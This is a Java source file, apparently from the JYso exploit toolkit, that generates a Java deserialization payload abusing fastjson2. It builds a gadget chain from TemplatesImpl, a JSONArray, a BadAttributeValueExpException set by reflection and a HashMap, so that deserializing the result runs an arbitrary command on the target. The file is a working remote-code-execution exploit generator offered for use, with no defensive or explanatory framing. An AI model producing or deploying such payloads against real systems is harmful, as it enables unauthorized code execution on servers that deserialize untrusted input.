package com.qi4l.JYso.gadgets;

import com.alibaba.fastjson2.JSONArray;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;


public class Fastjson2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        ClassPool pool       = ClassPool.getDefault();
        CtClass   clazz      = pool.makeClass("a");
        CtClass   superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
        clazz.addConstructor(constructor);
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field                         valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates, val);
        return hashMap;
    }
}
